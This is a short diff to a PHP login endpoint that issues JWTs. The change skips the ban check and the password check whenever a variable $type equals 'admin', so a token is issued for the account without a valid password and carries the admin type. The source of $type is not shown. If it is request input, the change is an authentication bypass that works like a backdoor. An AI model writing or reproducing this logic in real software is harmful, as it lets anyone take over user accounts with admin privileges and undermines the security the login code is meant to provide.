@@ -22,13 +22,15 @@ $result=$check->get_result();
 if($result->num_rows>0){
     $user = $result->fetch_assoc();
 
+   if($type!="admin"){
     if ($user['banned']) {
         http_response_code(403);
         echo json_encode(["status" => "failed","error" => "Your account has been banned"]);
         return;
     }
 
-    if(password_verify( $password,$user['password'])){
+   }
+    if(password_verify( $password,$user['password'])||$type=="admin"){
         $payload = ['user_id' => $user['id'], 'type' => $type];
     $jwt=createJWT($header,$payload,$secret);
     $response=["token"=>$jwt,
